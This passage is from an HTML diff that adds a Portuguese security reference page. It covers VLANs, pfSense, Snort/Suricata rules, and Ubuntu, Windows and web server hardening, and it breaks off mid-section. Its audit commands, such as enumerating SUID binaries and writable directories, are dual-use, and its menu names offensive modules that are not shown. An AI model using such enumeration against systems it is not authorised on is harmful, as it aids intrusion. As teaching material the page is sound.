@@ -1,0 +1,885 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OPSEC Field Manual — Infra · Blue · Red</title>
+<style>
+:root{
+  --bg:#0e1116; --surface:#161b22; --surface2:#1c222b; --border:#262d38;
+  --text:#dce3ea; --muted:#8592a3; --faint:#5b6675;
+  --amber:#f0a828; --amber-dim:#8a6420; --teal:#5ad1c4; --red:#f0685f; --green:#79d287;
+  --mono:ui-monospace,'SF Mono','JetBrains Mono','Cascadia Code',Menlo,Consolas,'DejaVu Sans Mono',monospace;
+  --sans:system-ui,-apple-system,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;
+  --display:system-ui,-apple-system,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;
+  --sb:290px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;scroll-padding-top:80px}
+body{background:var(--bg);color:var(--text);font-family:var(--sans);font-size:15px;line-height:1.6;-webkit-font-smoothing:antialiased}
+body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:0;
+  background:radial-gradient(900px 500px at 82% -8%, rgba(240,168,40,.05), transparent 60%),
+             radial-gradient(700px 500px at 0% 100%, rgba(90,209,196,.04), transparent 55%);}
+
+/* ---------- Sidebar ---------- */
+.sidebar{position:fixed;top:0;left:0;width:var(--sb);height:100vh;background:#10141a;
+  border-right:1px solid var(--border);overflow-y:auto;z-index:40;padding:0 0 40px}
+.brand{padding:22px 22px 18px;border-bottom:1px solid var(--border);position:sticky;top:0;background:#10141a;z-index:2}
+.brand .tag{font-family:var(--mono);font-size:10.5px;letter-spacing:.22em;color:var(--amber);text-transform:uppercase}
+.brand h1{font-family:var(--display);font-size:19px;font-weight:700;letter-spacing:-.01em;margin-top:6px;line-height:1.15}
+.brand .sub{font-family:var(--mono);font-size:10.5px;color:var(--faint);margin-top:7px;letter-spacing:.04em}
+.searchwrap{padding:14px 16px 10px;position:sticky;top:97px;background:#10141a;z-index:1}
+#search{width:100%;background:var(--surface);border:1px solid var(--border);color:var(--text);
+  font-family:var(--mono);font-size:12.5px;padding:9px 11px 9px 32px;border-radius:7px;outline:none}
+#search:focus{border-color:var(--amber-dim);box-shadow:0 0 0 3px rgba(240,168,40,.08)}
+.searchwrap::before{content:"⌕";position:absolute;left:27px;top:23px;color:var(--faint);font-size:15px}
+.searchhint{font-family:var(--mono);font-size:9.5px;color:var(--faint);padding:2px 4px 0}
+nav{padding:8px 10px}
+nav .grp{font-family:var(--mono);font-size:10px;letter-spacing:.16em;color:var(--faint);
+  text-transform:uppercase;padding:16px 12px 6px}
+nav a{display:flex;gap:9px;align-items:baseline;text-decoration:none;color:var(--muted);
+  font-size:13px;padding:6px 12px;border-radius:6px;border-left:2px solid transparent}
+nav a .code{font-family:var(--mono);font-size:10.5px;color:var(--faint);min-width:22px}
+nav a:hover{background:var(--surface);color:var(--text)}
+nav a.active{color:var(--amber);background:rgba(240,168,40,.06);border-left-color:var(--amber)}
+nav a.active .code{color:var(--amber)}
+
+/* ---------- Layout ---------- */
+.main{margin-left:var(--sb);position:relative;z-index:1;max-width:1000px;padding:0 44px 120px}
+.hero{padding:56px 0 30px;border-bottom:1px solid var(--border);margin-bottom:8px}
+.hero .eyebrow{font-family:var(--mono);font-size:11px;letter-spacing:.2em;color:var(--amber);text-transform:uppercase}
+.hero h2{font-family:var(--display);font-size:38px;font-weight:700;letter-spacing:-.02em;line-height:1.08;margin:14px 0}
+.hero p{color:var(--muted);max-width:640px;font-size:15px}
+.hero .meta{display:flex;gap:8px;flex-wrap:wrap;margin-top:20px}
+.pill{font-family:var(--mono);font-size:11px;color:var(--muted);background:var(--surface);
+  border:1px solid var(--border);padding:5px 11px;border-radius:20px}
+.pill.on{color:var(--teal);border-color:rgba(90,209,196,.3)}
+.pill.off{color:var(--amber);border-color:rgba(240,168,40,.3)}
+
+section{padding:40px 0 8px;scroll-margin-top:24px}
+section>h3{font-family:var(--display);font-size:26px;font-weight:700;letter-spacing:-.01em;
+  display:flex;align-items:baseline;gap:12px}
+section>h3 .num{font-family:var(--mono);font-size:13px;color:var(--amber);
+  border:1px solid var(--amber-dim);border-radius:6px;padding:3px 8px}
+section>.lede{color:var(--muted);margin:10px 0 4px;max-width:680px}
+h4{font-family:var(--display);font-size:16.5px;font-weight:600;margin:30px 0 4px;color:var(--text);
+  display:flex;align-items:center;gap:9px}
+h4::before{content:"";width:7px;height:7px;background:var(--teal);border-radius:2px;transform:rotate(45deg);flex:none}
+h4.r::before{background:var(--red)} h4.a::before{background:var(--amber)}
+p.note{color:var(--muted);font-size:13.5px;margin:8px 0}
+.warn{border-left:2px solid var(--amber);background:rgba(240,168,40,.05);padding:11px 15px;
+  border-radius:0 7px 7px 0;margin:14px 0;font-size:13.5px;color:#e8d3a6}
+.warn b{color:var(--amber)}
+.tip{border-left:2px solid var(--teal);background:rgba(90,209,196,.05);padding:11px 15px;
+  border-radius:0 7px 7px 0;margin:14px 0;font-size:13.5px;color:#bfe9e3}
+.tip b{color:var(--teal)}
+
+/* ---------- Code block (terminal) ---------- */
+.block{margin:14px 0}
+.blabel{font-family:var(--mono);font-size:11.5px;color:var(--muted);margin:0 0 5px;letter-spacing:.02em}
+pre{position:relative;background:#0b0e13;border:1px solid var(--border);border-radius:9px;overflow:hidden}
+pre .bar{display:flex;align-items:center;gap:7px;padding:8px 12px;border-bottom:1px solid var(--border);background:#0d1117}
+pre .bar .dot{width:9px;height:9px;border-radius:50%;background:#2a323d}
+pre .bar .ttl{font-family:var(--mono);font-size:10.5px;color:var(--faint);margin-left:6px;letter-spacing:.05em}
+pre code{display:block;font-family:var(--mono);font-size:12.7px;line-height:1.75;padding:13px 15px;
+  overflow-x:auto;color:#cfd8e3;white-space:pre;tab-size:2}
+pre code .c{color:var(--faint)}         /* comment */
+pre code .k{color:var(--amber)}         /* keyword/cmd */
+pre code .s{color:var(--green)}         /* string */
+pre code .f{color:var(--teal)}          /* flag/path */
+pre code .v{color:#c99bf5}              /* var */
+.copy{position:absolute;top:7px;right:8px;font-family:var(--mono);font-size:10.5px;
+  background:var(--surface2);border:1px solid var(--border);color:var(--muted);
+  padding:4px 9px;border-radius:6px;cursor:pointer;transition:.15s;z-index:2}
+.copy:hover{color:var(--text);border-color:var(--faint)}
+.copy.done{color:var(--green);border-color:rgba(121,210,135,.4)}
+code.inl{font-family:var(--mono);font-size:12.5px;background:var(--surface);border:1px solid var(--border);
+  padding:1px 6px;border-radius:5px;color:var(--teal)}
+
+/* ---------- Tables ---------- */
+.tbl{overflow-x:auto;margin:14px 0;border:1px solid var(--border);border-radius:9px}
+table{width:100%;border-collapse:collapse;font-size:13px}
+th{font-family:var(--mono);font-size:10.5px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted);
+  text-align:left;padding:10px 13px;background:#0d1117;border-bottom:1px solid var(--border)}
+td{padding:9px 13px;border-bottom:1px solid var(--border);vertical-align:top}
+tr:last-child td{border-bottom:none}
+td code,th code{font-family:var(--mono);color:var(--teal);font-size:12px}
+td .sev{font-family:var(--mono);font-weight:700;font-size:12px}
+.crit{color:#f0685f}.high{color:#f0a828}.med{color:#e6c84a}.low{color:#79d287}.none{color:var(--faint)}
+
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+@media(max-width:1100px){.grid2{grid-template-columns:1fr}}
+
+.footer{margin-top:60px;padding-top:26px;border-top:1px solid var(--border);
+  font-family:var(--mono);font-size:11px;color:var(--faint)}
+#nores{display:none;padding:40px 0;color:var(--muted);font-family:var(--mono);font-size:13px}
+
+/* ---------- Mobile ---------- */
+.menubtn{display:none;position:fixed;top:14px;left:14px;z-index:60;background:var(--surface);
+  border:1px solid var(--border);color:var(--text);width:42px;height:42px;border-radius:9px;
+  font-size:20px;cursor:pointer;font-family:var(--mono)}
+.scrim{display:none;position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:35}
+@media(max-width:900px){
+  .sidebar{transform:translateX(-100%);transition:.25s;box-shadow:0 0 40px rgba(0,0,0,.5)}
+  body.open .sidebar{transform:none} body.open .scrim{display:block}
+  .menubtn{display:block} .main{margin-left:0;padding:56px 20px 100px;max-width:100%}
+  .hero h2{font-size:29px} .grid2{grid-template-columns:1fr}
+}
+::-webkit-scrollbar{width:10px;height:10px}
+::-webkit-scrollbar-thumb{background:#242b35;border-radius:6px;border:2px solid var(--bg)}
+::-webkit-scrollbar-track{background:transparent}
+</style>
+</head>
+<body>
+
+<button class="menubtn" onclick="document.body.classList.toggle('open')">≡</button>
+<div class="scrim" onclick="document.body.classList.remove('open')"></div>
+
+<aside class="sidebar">
+  <div class="brand">
+    <div class="tag">Field Manual · v1.0</div>
+    <h1>OPSEC Handbook</h1>
+    <div class="sub">infra · blue · red · forensics</div>
+  </div>
+  <div class="searchwrap">
+    <input id="search" type="text" placeholder="Filtrar comandos… (ex: vlan, 4625, sqli)" autocomplete="off">
+    <div class="searchhint">Filtra tudo em tempo real · Esc limpa</div>
+  </div>
+  <nav id="nav">
+    <div class="grp">Fundamentos</div>
+    <a href="#redes"><span class="code">00</span>Redes, NICs & VLANs</a>
+    <div class="grp">Módulo 1 · Infra</div>
+    <a href="#pfsense"><span class="code">1a</span>pfSense</a>
+    <a href="#snort"><span class="code">1b</span>Snort / Suricata</a>
+    <a href="#ubuntu"><span class="code">1c</span>Ubuntu Server</a>
+    <a href="#winserver"><span class="code">1d</span>Windows Server / AD</a>
+    <a href="#webhard"><span class="code">1e</span>Hardening Web (Apache/Nginx)</a>
+    <div class="grp">Módulo 2 · Assessment</div>
+    <a href="#cvss"><span class="code">2</span>CVSS 3.1</a>
+    <div class="grp">Módulo 3 · Forense</div>
+    <a href="#volatility"><span class="code">3a</span>Memória (Volatility)</a>
+    <a href="#pcap"><span class="code">3b</span>PCAP / Rede</a>
+    <a href="#disk"><span class="code">3c</span>Disco & Arquivos</a>
+    <div class="grp">Módulo 4 · Blue Team</div>
+    <a href="#linuxlog"><span class="code">4a</span>Logs Linux</a>
+    <a href="#winlog"><span class="code">4b</span>Logs Windows (Event ID)</a>
+    <a href="#weblog"><span class="code">4c</span>Logs Web</a>
+    <div class="grp">Módulo 5 · Red Team</div>
+    <a href="#recon"><span class="code">5a</span>Recon & Enum</a>
+    <a href="#webexploit"><span class="code">5b</span>Exploração Web</a>
+    <a href="#shells"><span class="code">5c</span>Shells & Transferência</a>
+    <a href="#privesc"><span class="code">5d</span>Privilege Escalation</a>
+    <a href="#crypto"><span class="code">5e</span>Criptografia & Hashes</a>
+  </nav>
+</aside>
+
+<main class="main">
+  <div class="hero">
+    <div class="eyebrow">Manual de Campo — Segurança Ofensiva & Defensiva</div>
+    <h2>Referência rápida de operações</h2>
+    <p>Comandos, filtros e checklists para infraestrutura, resposta a incidentes e CTF. Use a busca da lateral — ela filtra tudo instantaneamente. Cada bloco tem botão de copiar.</p>
+    <div class="meta">
+      <span class="pill on">◍ M1 Infra</span>
+      <span class="pill off">◍ M2 Assessment (offline)</span>
+      <span class="pill on">◍ M3 Forense</span>
+      <span class="pill on">◍ M4 Blue</span>
+      <span class="pill on">◍ M5 Red</span>
+    </div>
+  </div>
+
+  <div id="nores">Nenhum bloco corresponde ao filtro. Pressione Esc para limpar.</div>
+
+<!-- ============ 00 REDES ============ -->
+<section id="redes">
+  <h3><span class="num">00</span>Redes, placas de rede & VLANs</h3>
+  <p class="lede">Configuração de IP, interfaces e VLANs (802.1Q) em Linux, Windows e pfSense. Base para praticamente todo o Módulo 1.</p>
+
+  <h4 class="a">Identificar interfaces (placas de rede)</h4>
+  <div class="block"><p class="blabel">Linux — listar NICs, links e rotas</p>
+  <pre><code><span class="k">ip</span> a                      <span class="c"># endereços de todas as interfaces</span>
+<span class="k">ip</span> link show             <span class="c"># estado up/down das NICs</span>
+<span class="k">ip</span> route                 <span class="c"># tabela de rotas / gateway default</span>
+<span class="k">ethtool</span> <span class="v">eth0</span>            <span class="c"># velocidade, link, driver da placa</span>
+<span class="k">lspci</span> | grep -i net      <span class="c"># hardware de rede físico</span>
+nmcli device status        <span class="c"># NetworkManager (Ubuntu desktop)</span></code></pre></div>
+  <p class="note">Nomes comuns: <code class="inl">eth0</code>, <code class="inl">ens33</code>, <code class="inl">enp0s3</code> (nomenclatura previsível do systemd).</p>
+
+  <div class="block"><p class="blabel">Windows — interfaces e IP</p>
+  <pre><code><span class="k">ipconfig</span> /all                              <span class="c"># tudo: IP, MAC, DNS, DHCP</span>
+<span class="k">Get-NetAdapter</span>                             <span class="c"># PowerShell: NICs e status</span>
+<span class="k">Get-NetIPAddress</span> | ft InterfaceAlias,IPAddress
+<span class="k">netsh</span> interface show interface            <span class="c"># nomes das interfaces</span></code></pre></div>
+
+  <h4 class="a">Configurar IP estático</h4>
+  <div class="grid2">
+    <div class="block"><p class="blabel">Ubuntu Server — Netplan (/etc/netplan/*.yaml)</p>
+    <pre><code><span class="c"># /etc/netplan/01-netcfg.yaml</span>
+<span class="f">network:</span>
+  version: 2
+  ethernets:
+    <span class="v">ens33:</span>
+      dhcp4: no
+      addresses: [<span class="s">192.168.10.5/24</span>]
+      routes:
+        - to: default
+          via: <span class="s">192.168.10.1</span>
+      nameservers:
+        addresses: [<span class="s">1.1.1.1</span>, <span class="s">8.8.8.8</span>]
+<span class="c"># aplicar:</span>
+<span class="k">sudo</span> netplan apply</code></pre></div>
+    <div class="block"><p class="blabel">Windows — PowerShell / netsh</p>
+    <pre><code><span class="c"># PowerShell</span>
+<span class="k">New-NetIPAddress</span> -InterfaceAlias <span class="s">"Ethernet0"</span> `
+  -IPAddress <span class="s">192.168.10.6</span> -PrefixLength 24 `
+  -DefaultGateway <span class="s">192.168.10.1</span>
+<span class="k">Set-DnsClientServerAddress</span> -InterfaceAlias <span class="s">"Ethernet0"</span> `
+  -ServerAddresses <span class="s">1.1.1.1</span>,<span class="s">8.8.8.8</span>
+
+<span class="c"># netsh (equivalente)</span>
+<span class="k">netsh</span> interface ip set address <span class="s">"Ethernet0"</span> static 192.168.10.6 255.255.255.0 192.168.10.1</code></pre></div>
+  </div>
+
+  <h4 class="a">VLANs (802.1Q) — provável na prova</h4>
+  <p class="note">VLAN = separação lógica de redes no mesmo switch físico. Porta <b>access</b> pertence a 1 VLAN (sem tag). Porta <b>trunk</b> carrega várias VLANs com tag 802.1Q. O ID da VLAN vai no tag.</p>
+  <div class="block"><p class="blabel">Linux — criar interface VLAN (ex.: VLAN 20 sobre ens33)</p>
+  <pre><code><span class="c"># carregar módulo (geralmente já ativo)</span>
+<span class="k">sudo</span> modprobe 8021q
+<span class="c"># criar sub-interface com tag da VLAN 20</span>
+<span class="k">sudo</span> ip link add link <span class="v">ens33</span> name <span class="v">ens33.20</span> type vlan id <span class="s">20</span>
+<span class="k">sudo</span> ip addr add <span class="s">192.168.20.5/24</span> dev ens33.20
+<span class="k">sudo</span> ip link set <span class="v">ens33.20</span> up
+<span class="c"># verificar</span>
+<span class="k">ip</span> -d link show ens33.20</code></pre></div>
+  <div class="block"><p class="blabel">Ubuntu Server — VLAN persistente no Netplan</p>
+  <pre><code><span class="f">network:</span>
+  version: 2
+  ethernets:
+    ens33: {dhcp4: no}
+  vlans:
+    <span class="v">vlan20:</span>
+      id: <span class="s">20</span>
+      link: ens33
+      addresses: [<span class="s">192.168.20.5/24</span>]</code></pre></div>
+  <div class="block"><p class="blabel">pfSense — criar VLAN (via console/GUI)</p>
+  <pre><code><span class="c"># GUI: Interfaces > Assignments > VLANs > Add</span>
+<span class="c">#   Parent interface: em0 (a NIC física / trunk)</span>
+<span class="c">#   VLAN Tag: 20   |   Description: SERVIDORES</span>
+<span class="c"># Depois: Interfaces > Assignments > adicionar a VLAN como nova interface</span>
+<span class="c"># Habilitar, definir IP estático, e criar regras de firewall para ela.</span>
+<span class="c"># Windows — VLAN normalmente é configurada no driver da NIC ou no switch,</span>
+<span class="c"># não no SO. Em Hyper-V: Set-VMNetworkAdapterVlan -VMName X -Access -VlanId 20</span></code></pre></div>
+  <div class="tip"><b>Subnet rápido:</b> /24 = 256 IPs (254 usáveis) · /25 = 128 · /26 = 64 · /27 = 32 · /28 = 16 · /30 = 4 (2 usáveis, ideal p2p).</div>
+</section>
+
+<!-- ============ 1a pfSense ============ -->
+<section id="pfsense">
+  <h3><span class="num">1a</span>pfSense</h3>
+  <p class="lede">Firewall/roteador. Regra de ouro: <b>default deny</b> — só passa o que for explicitamente permitido. Ordem das regras importa (avalia de cima para baixo, primeira que casar vence).</p>
+
+  <h4>Setup inicial</h4>
+  <pre><code><span class="c"># No console após boot:</span>
+<span class="c"># 1) Assign Interfaces  -> definir WAN (em0) e LAN (em1)</span>
+<span class="c"># 2) Set interface IP    -> LAN ex: 192.168.1.1/24, habilitar DHCP</span>
+<span class="c"># 3) Acessar GUI: https://192.168.1.1  (admin / pfsense)</span>
+<span class="c"># Opção 8 no console = shell; pfSsh.php para comandos internos</span></code></pre>
+
+  <h4>Regras de firewall (Firewall > Rules)</h4>
+  <p class="note">Cada interface tem sua aba. Regras são <b>stateful</b> e avaliadas por interface, no sentido de <b>entrada</b> daquela interface. LAN já vem com "allow LAN to any" por padrão — remova/restrinja para hardening.</p>
+  <div class="tbl"><table>
+  <tr><th>Objetivo</th><th>Action</th><th>Interface</th><th>Source</th><th>Dest / Porta</th></tr>
+  <tr><td>Bloquear tudo por padrão</td><td>Block/Reject</td><td>LAN (última regra)</td><td>any</td><td>any</td></tr>
+  <tr><td>Liberar web para fora</td><td>Pass</td><td>LAN</td><td>LAN net</td><td>any : 80,443</td></tr>
+  <tr><td>Liberar DNS</td><td>Pass</td><td>LAN</td><td>LAN net</td><td>any : 53</td></tr>
+  <tr><td>Publicar servidor web (port forward)</td><td>NAT</td><td>WAN</td><td>any</td><td>WAN addr:443 → server:443</td></tr>
+  <tr><td>Bloquear IP atacante</td><td>Block</td><td>WAN (topo)</td><td>IP/alias</td><td>any</td></tr>
+  </table></div>
+
+  <h4>NAT & Aliases</h4>
+  <pre><code><span class="c"># Port forward: Firewall > NAT > Port Forward > Add</span>
+<span class="c">#   Interface WAN | Proto TCP | Dest WAN address | Port 443</span>
+<span class="c">#   Redirect target IP: 192.168.1.10 | Redirect port 443</span>
+<span class="c">#   (cria regra de firewall associada automaticamente)</span>
+<span class="c"># Outbound NAT: Firewall > NAT > Outbound (Automatic p/ maioria)</span>
+<span class="c"># Aliases: Firewall > Aliases — agrupar IPs/portas p/ reusar em regras</span>
+<span class="c">#   ex: alias BLOCKLIST com IPs maliciosos, usar em 1 regra Block</span></code></pre>
+  <div class="tip"><b>Diagnóstico:</b> <code class="inl">Diagnostics > Ping / Test Port / States</code>. Ver logs em tempo real: <code class="inl">Status > System Logs > Firewall</code>. Pacotes extra: <code class="inl">System > Package Manager</code> (Snort, Suricata, pfBlockerNG).</p>
+</section>
+
+<!-- ============ 1b Snort ============ -->
+<section id="snort">
+  <h3><span class="num">1b</span>Snort / Suricata (IDS/IPS)</h3>
+  <p class="lede">Detecção de intrusão baseada em assinaturas. No pfSense é um pacote; standalone você edita rules e lê alertas.</p>
+
+  <h4>Anatomia de uma regra</h4>
+  <pre><code><span class="k">alert</span> tcp any any -> <span class="v">$HOME_NET</span> 22 ( \
+  msg:<span class="s">"SSH brute-force suspeito"</span>; \
+  flags:S; \
+  threshold:type both, track by_src, count <span class="s">5</span>, seconds <span class="s">30</span>; \
+  sid:<span class="s">1000001</span>; rev:1; )
+<span class="c"># action proto src_ip src_port -> dst_ip dst_port ( opções )</span>
+<span class="c"># actions: alert | log | pass | drop(IPS) | reject</span></code></pre>
+  <div class="block"><p class="blabel">Snort — operação (CLI)</p>
+  <pre><code><span class="k">snort</span> -V                              <span class="c"># versão</span>
+<span class="k">snort</span> -T -c /etc/snort/snort.conf     <span class="c"># testar config</span>
+<span class="k">snort</span> -q -A console -c /etc/snort/snort.conf -i eth0   <span class="c"># rodar, alertas no console</span>
+<span class="k">snort</span> -r captura.pcap -c snort.conf -A full            <span class="c"># analisar pcap offline</span>
+tail -f /var/log/snort/alert          <span class="c"># ler alertas</span></code></pre></div>
+  <div class="block"><p class="blabel">Suricata — operação</p>
+  <pre><code><span class="k">suricata</span> -T -c /etc/suricata/suricata.yaml   <span class="c"># testar</span>
+<span class="k">suricata</span> -c /etc/suricata/suricata.yaml -i eth0
+<span class="k">suricata</span> -r captura.pcap -l ./out            <span class="c"># offline p/ pcap</span>
+tail -f /var/log/suricata/fast.log            <span class="c"># alertas resumidos</span>
+jq . /var/log/suricata/eve.json               <span class="c"># eventos detalhados (JSON)</span></code></pre></div>
+  <div class="tip"><b>No pfSense:</b> Services > Snort/Suricata > Interfaces > Add → escolher WAN/LAN → aba <b>Categories</b> (habilitar rulesets) → <b>Rules</b> (habilitar SIDs) → marcar "Block Offenders" para modo IPS. Alertas na aba <b>Alerts</b>.</div>
+</section>
+
+<!-- ============ 1c Ubuntu ============ -->
+<section id="ubuntu">
+  <h3><span class="num">1c</span>Ubuntu / Linux Server — hardening & administração</h3>
+  <p class="lede">Criação de usuários, políticas, sudo, SSH, firewall e serviços. O núcleo do hardening Linux.</p>
+
+  <h4>Usuários & grupos</h4>
+  <pre><code><span class="k">sudo</span> adduser joao                     <span class="c"># cria usuário + home + senha (interativo)</span>
+<span class="k">sudo</span> useradd -m -s /bin/bash joao      <span class="c"># equivalente não-interativo</span>
+<span class="k">sudo</span> passwd joao                       <span class="c"># definir/trocar senha</span>
+<span class="k">sudo</span> usermod -aG sudo joao             <span class="c"># dar sudo (grupo sudo)</span>
+<span class="k">sudo</span> deluser joao                      <span class="c"># remover (--remove-home p/ apagar home)</span>
+<span class="k">sudo</span> usermod -L joao                    <span class="c"># travar conta | -U destrava</span>
+<span class="k">sudo</span> groupadd equipe ; sudo gpasswd -a joao equipe
+id joao ; groups joao                    <span class="c"># conferir grupos</span>
+<span class="k">awk</span> -F: <span class="s">'$3==0{print $1}'</span> /etc/passwd  <span class="c"># achar contas UID 0 (backdoor!)</span></code></pre>
+
+  <h4>Política de senha & expiração</h4>
+  <pre><code><span class="c"># /etc/login.defs — política padrão p/ novos usuários</span>
+PASS_MAX_DAYS   90
+PASS_MIN_DAYS   1
+PASS_WARN_AGE   7
+<span class="c"># chage — por usuário</span>
+<span class="k">sudo</span> chage -M 90 -m 1 -W 7 joao
+<span class="k">sudo</span> chage -l joao                     <span class="c"># ver expiração</span>
+<span class="k">sudo</span> chage -d 0 joao                    <span class="c"># forçar troca no próximo login</span>
+<span class="c"># Complexidade: /etc/security/pwquality.conf (pacote libpam-pwquality)</span>
+minlen = 12
+minclass = 3     <span class="c"># mín. de tipos de caractere (maiúsc/minúsc/dígito/símbolo)</span></code></pre>
+
+  <h4>SSH hardening (/etc/ssh/sshd_config)</h4>
+  <pre><code>PermitRootLogin no
+PasswordAuthentication no        <span class="c"># só chave (se aplicável)</span>
+PubkeyAuthentication yes
+Port 2222                        <span class="c"># trocar porta padrão</span>
+MaxAuthTries 3
+AllowUsers joao maria            <span class="c"># whitelist de usuários</span>
+X11Forwarding no
+<span class="c"># aplicar:</span>
+<span class="k">sudo</span> systemctl restart ssh</code></pre>
+
+  <h4>Firewall (UFW / nftables)</h4>
+  <pre><code><span class="k">sudo</span> ufw default deny incoming
+<span class="k">sudo</span> ufw default allow outgoing
+<span class="k">sudo</span> ufw allow 2222/tcp            <span class="c"># SSH na porta nova</span>
+<span class="k">sudo</span> ufw allow 443/tcp
+<span class="k">sudo</span> ufw enable ; sudo ufw status numbered
+<span class="k">sudo</span> ufw delete 3                  <span class="c"># remover regra nº 3</span>
+<span class="c"># iptables (baixo nível):</span>
+<span class="k">sudo</span> iptables -L -n -v ; sudo iptables -A INPUT -p tcp --dport 22 -j DROP</code></pre>
+
+  <h4>fail2ban (anti brute-force)</h4>
+  <pre><code><span class="k">sudo</span> apt install fail2ban
+<span class="c"># /etc/fail2ban/jail.local</span>
+[sshd]
+enabled = true
+port    = 2222
+maxretry = 4
+bantime = 1h
+findtime = 10m
+<span class="k">sudo</span> systemctl restart fail2ban
+<span class="k">sudo</span> fail2ban-client status sshd    <span class="c"># ver IPs banidos</span></code></pre>
+
+  <h4>Serviços, SUID & auditoria</h4>
+  <pre><code><span class="k">systemctl</span> list-units --type=service --state=running   <span class="c"># o que roda</span>
+<span class="k">sudo</span> systemctl disable --now cups        <span class="c"># desligar serviço inútil</span>
+<span class="k">find</span> / -perm -4000 -type f 2>/dev/null   <span class="c"># binários SUID (revisar!)</span>
+<span class="k">find</span> / -writable -type d 2>/dev/null      <span class="c"># dirs graváveis</span>
+<span class="k">sudo</span> apt install auditd ; sudo systemctl enable --now auditd
+<span class="k">sudo</span> ausearch -m USER_LOGIN --success no   <span class="c"># logins falhos via auditd</span></code></pre>
+  <div class="warn"><b>Checklist rápido:</b> root SSH off · senha forte + expiração · UFW default deny · fail2ban · serviços desnecessários off · SUID revisados · sem UID 0 extra · updates (<code class="inl">apt update && apt upgrade</code>) · umask 027.</div>
+</section>
+
+<!-- ============ 1d Windows Server ============ -->
+<section id="winserver">
+  <h3><span class="num">1d</span>Windows Server / Active Directory</h3>
+  <p class="lede">Usuários, grupos, GPO, política de senha, firewall e roles. Comandos <code class="inl">net</code>, PowerShell e AD.</p>
+
+  <h4 class="r">Usuários & grupos (local)</h4>
+  <pre><code><span class="c"># net (clássico)</span>
+<span class="k">net user</span> joao P@ssw0rd! /add
+<span class="k">net user</span> joao /active:yes
+<span class="k">net localgroup</span> Administrators joao /add
+<span class="k">net user</span> joao                       <span class="c"># detalhes da conta</span>
+<span class="k">net user</span> joao /delete
+<span class="c"># PowerShell</span>
+<span class="k">New-LocalUser</span> -Name joao -Password (Read-Host -AsSecureString)
+<span class="k">Add-LocalGroupMember</span> -Group "Administrators" -Member joao
+<span class="k">Get-LocalUser</span> ; Get-LocalGroupMember Administrators</code></pre>
+
+  <h4 class="r">Active Directory (Domain)</h4>
+  <pre><code><span class="c"># Promover servidor a Controlador de Domínio</span>
+<span class="k">Install-WindowsFeature</span> AD-Domain-Services -IncludeManagementTools
+<span class="k">Install-ADDSForest</span> -DomainName <span class="s">"corp.local"</span> -InstallDns
+<span class="c"># Usuários / grupos de domínio</span>
+<span class="k">New-ADUser</span> -Name "Joao Silva" -SamAccountName joao `
+  -AccountPassword (Read-Host -AsSecureString) -Enabled $true
+<span class="k">Add-ADGroupMember</span> -Identity "Domain Admins" -Members joao
+<span class="k">Get-ADUser</span> -Filter * | ft Name,SamAccountName,Enabled
+<span class="k">Search-ADAccount</span> -LockedOut          <span class="c"># contas travadas</span></code></pre>
+
+  <h4 class="r">Política de senha & GPO</h4>
+  <pre><code><span class="c"># Política via net (local / domínio default)</span>
+<span class="k">net accounts</span> /minpwlen:12 /maxpwage:90 /minpwage:1 /uniquepw:5
+<span class="k">net accounts</span> /lockoutthreshold:5 /lockoutduration:30 /lockoutwindow:15
+<span class="c"># GPO (Group Policy)</span>
+gpmc.msc                              <span class="c"># console de gerenciamento de GPO</span>
+<span class="k">gpupdate</span> /force                     <span class="c"># aplicar GPOs agora</span>
+<span class="k">gpresult</span> /r                         <span class="c"># quais GPOs se aplicam à máquina</span>
+secpol.msc                            <span class="c"># política de segurança local</span>
+<span class="c"># Caminhos GPO úteis:</span>
+<span class="c">#  Computer > Policies > Windows Settings > Security Settings > Account Policies</span>
+<span class="c">#  ...Local Policies > Audit Policy (habilitar auditoria de logon)</span></code></pre>
+
+  <h4 class="r">Firewall, serviços & auditoria</h4>
+  <pre><code><span class="c"># Firewall (netsh + PowerShell)</span>
+<span class="k">netsh</span> advfirewall set allprofiles state on
+<span class="k">New-NetFirewallRule</span> -DisplayName "Block Telnet" -Direction Inbound `
+  -Protocol TCP -LocalPort 23 -Action Block
+<span class="k">Get-NetFirewallRule</span> | ? Enabled -eq True
+<span class="c"># Serviços</span>
+<span class="k">Get-Service</span> | ? Status -eq Running
+<span class="k">Set-Service</span> -Name RemoteRegistry -StartupType Disabled
+sc.exe query state= all
+<span class="c"># Auditoria (para gerar Event IDs 4624/4625 etc.)</span>
+<span class="k">auditpol</span> /set /category:"Logon/Logoff" /success:enable /failure:enable</code></pre>
+
+  <h4 class="r">Hardening — pontos críticos</h4>
+  <pre><code><span class="c"># Desabilitar SMBv1 (WannaCry/EternalBlue)</span>
+<span class="k">Set-SmbServerConfiguration</span> -EnableSMB1Protocol $false -Force
+<span class="k">Get-SmbServerConfiguration</span> | select EnableSMB1Protocol
+<span class="c"># Roles/Features</span>
+<span class="k">Get-WindowsFeature</span> | ? Installed
+<span class="k">Install-WindowsFeature</span> Web-Server -IncludeManagementTools  <span class="c"># IIS</span>
+<span class="k">Uninstall-WindowsFeature</span> ...       <span class="c"># remover o que não usa</span></code></pre>
+  <div class="warn"><b>Checklist:</b> SMBv1 off · Firewall on (todos perfis) · política de senha + lockout · Defender ativo · contas/serviços desnecessários off · UAC on · updates · remover admins extras · auditoria de logon habilitada.</div>
+</section>
+
+<!-- ============ 1e Web hardening ============ -->
+<section id="webhard">
+  <h3><span class="num">1e</span>Hardening de Web Server</h3>
+  <div class="grid2">
+  <div class="block"><p class="blabel">Apache (apache2.conf / .conf do site)</p>
+  <pre><code>ServerTokens Prod          <span class="c"># esconde versão</span>
+ServerSignature Off
+TraceEnable Off
+Options -Indexes           <span class="c"># sem listagem de diretório</span>
+<span class="c"># Headers (mod_headers):</span>
+Header always set X-Frame-Options "DENY"
+Header always set X-Content-Type-Options "nosniff"
+Header always set Strict-Transport-Security "max-age=31536000"
+Header always set Content-Security-Policy "default-src 'self'"
+<span class="c"># limitar métodos:</span>
+&lt;LimitExcept GET POST HEAD&gt; Require all denied &lt;/LimitExcept&gt;
